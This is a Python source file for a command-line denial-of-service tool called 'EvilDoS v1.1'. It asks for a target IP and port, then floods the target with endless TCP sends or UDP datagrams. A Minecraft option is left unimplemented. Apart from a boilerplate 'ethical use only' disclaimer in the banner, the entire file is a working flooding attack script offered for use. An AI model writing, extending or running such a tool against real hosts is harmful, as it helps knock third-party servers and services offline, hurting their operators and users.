import os
import socket

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ███████╗
    ██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔════╝
    █████╗  ██║   ██║██║██║     ██████╔╝██║   ██║███████╗
    ██╔══╝  ██║   ██║██║██║     ██╔═══╝ ██║   ██║╚════██║
    ███████╗╚██████╔╝██║███████╗██║     ╚██████╔╝███████║
    ╚══════╝ ╚═════╝ ╚═╝╚══════╝╚═╝      ╚═════╝ ╚══════╝

    EvilDoS v1.1
    ----------------------------------------------------
    This tool is for ethical use only. Unauthorized use
    is illegal and punishable by law.
    ----------------------------------------------------
    """
    print(banner)

def print_menu():
    menu = """
    Method
    1] Minecraft
    2] TCP
    3] UDP
    """
    print(menu)

def perform_dos(target_ip, target_port, method):
    if method == "TCP":
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((target_ip, target_port))
                while True:
                    sock.send(b"GET / HTTP/1.1\r\n")
            except Exception as e:
                print(f"Error: {e}")
    elif method == "UDP":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                while True:
                    sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            except Exception as e:
                print(f"Error: {e}")
    else:
        print("Invalid method selected.")

def main():
    clear_screen()
    print_banner()
    print_menu()
    
    method = input("Select method (1/2/3): ")
    if method == "1":
        print("Minecraft DoS is not implemented in this example.")
    else:
        target_ip = input("Enter target IP: ")
        target_port = int(input("Enter target port: "))
        if method == "2":
            perform_dos(target_ip, target_port, "TCP")
        elif method == "3":
            perform_dos(target_ip, target_port, "UDP")
        else:
            print("Invalid method selected.")

if __name__ == "__main__":
    main()
